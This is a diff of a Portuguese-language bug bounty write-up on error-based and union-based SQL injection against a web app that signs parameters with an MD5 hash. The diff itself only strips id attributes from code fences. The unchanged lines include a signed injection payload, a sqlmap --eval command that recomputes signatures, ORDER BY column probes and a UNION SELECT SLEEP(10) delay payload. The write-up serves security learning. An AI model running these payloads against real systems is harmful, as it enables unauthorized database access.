@@ -295,7 +295,6 @@ O foco é observar diferenças sutis na aplicação.
 
 ---
 
-
 # 💥 Error-Based e Union-Based SQL Injection
 
 Em alguns cenários reais, vulnerabilidades de SQL Injection são difíceis de detectar com ferramentas automatizadas.
@@ -317,7 +316,7 @@ A aplicação exigia uma assinatura (`sig`) em todas as requisições.
 
 ## Exemplo
 
-```text id="g8s3wt"
+```text
 ?param=1&sig=MD5_HASH
 ```
 
@@ -331,7 +330,7 @@ O pesquisador encontrou na documentação vazada a fórmula usada pela aplicaç�
 
 ## Fórmula
 
-```text id="7eb5r6"
+```text
 assinatura = md5(param_value + SecretKey)
 ```
 
@@ -357,7 +356,7 @@ Após descobrir a lógica:
 
 ## Payload
 
-```text id="6sy4u2"
+```text
 ?param=1111"&sig=d2d0114df70a4485a8d836efa018b28d
 ```
 
@@ -377,7 +376,7 @@ A equipe pediu uma prova mais forte da vulnerabilidade.
 
 Objetivo:
 
-```text id="wk2e45"
+```text
 Gerar um atraso de 10 segundos na resposta do servidor
 ```
 
@@ -407,7 +406,7 @@ Por isso, o pesquisador criou um script em PHP para:
 
 O SQLMap possui suporte para automatizar parâmetros calculados através da opção:
 
-```bash id="3nl4d7"
+```bash
 --eval
 ```
 
@@ -429,7 +428,7 @@ O SQLMap NÃO descobre automaticamente a fórmula da assinatura.
 
 # ⚙️ Exemplo com `--eval`
 
-```bash id="p5ycpx"
+```bash
 sqlmap -u "http://site.com/?id=1&sig=HASH" \
 --eval="import hashlib; sig=hashlib.md5(id+SECRET).hexdigest()"
 ```
@@ -459,7 +458,7 @@ Essa técnica ajuda a descobrir quantas colunas existem na consulta original.
 
 ## ORDER BY 1
 
-```sql id="1bqarf"
+```sql
 id=10 ORDER BY 1--+-
 ```
 
@@ -469,7 +468,7 @@ id=10 ORDER BY 1--+-
 
 ## ORDER BY 2
 
-```sql id="l5od4u"
+```sql
 id=10 ORDER BY 2--+-
 ```
 
@@ -479,7 +478,7 @@ id=10 ORDER BY 2--+-
 
 ## ORDER BY 3
 
-```sql id="l6lbme"
+```sql
 id=10 ORDER BY 3--+-
 ```
 
@@ -489,7 +488,7 @@ id=10 ORDER BY 3--+-
 
 ## ORDER BY 4
 
-```sql id="fqt7kn"
+```sql
 id=10 ORDER BY 4--+-
 ```
 
@@ -503,7 +502,7 @@ Se `ORDER BY 4` gera erro:
 
 Então a query possui:
 
-```text id="yqljl7"
+```text
 3 colunas
 ```
 
@@ -519,7 +518,7 @@ Depois de descobrir a quantidade de colunas, ele utilizou `UNION SELECT`.
 
 # ⏳ Payload com Delay
 
-```sql id="jlwmg8"
+```sql
 UNION SELECT 1,SLEEP(10),3--+-
 ```
 
@@ -540,7 +539,7 @@ UNION SELECT 1,SLEEP(10),3--+-
 
 A resposta do servidor demorou aproximadamente:
 
-```text id="h6n6kn"
+```text
 10 segundos
 ```
 
@@ -602,7 +601,7 @@ Neste caso:
 
 A falha resultou em:
 
-```text id="4vpxn2"
+```text
 Bug bounty de 2.000 dólares
 ```
 
@@ -645,4 +644,3 @@ Muitos cenários reais exigem:
 * Scripts customizados
 * Análise manual
 * Entendimento profundo da aplicação
-
